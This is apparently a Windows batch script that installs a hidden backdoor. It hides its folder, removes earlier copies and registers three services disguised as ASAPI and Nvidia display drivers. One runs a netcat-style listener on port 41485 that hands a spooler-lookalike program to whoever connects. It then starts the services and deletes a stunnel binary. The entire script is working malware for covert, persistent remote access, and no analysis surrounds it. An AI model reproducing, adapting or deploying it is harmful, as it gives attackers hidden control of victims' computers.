@echo off
attrib +h +s
net stop asapi
net stop NVidianc
net stop NVidianc2
svchost remove asapi
svchost remove nvidianc
svchost remove nvidianc2


svchost.exe install asapi ASAPIDriver "ASAPI Driver Service" "%SystemDrive%\ExPerT\DooR\asapi.exe" 1 1
svchost.exe install Nvidianc NvidiaDriver "Nvidia Display Driver" "%SystemDrive%\ExPerT\DooR\nvidiadrv.exe -L -d -e spooIsv.exe -p 41485" 1 1
svchost.exe install Nvidianc2 NidiaManager "Nvidia Display Manager" "%SystemDrive%\ExPerT\DooR\nvidiamngr.exe" 1 1

net1 start asapi
net1 start nvidianc
net1 start Nvidianc2
del %SystemDrive%\ExPerT\AppZz\stunnel.exe
exit


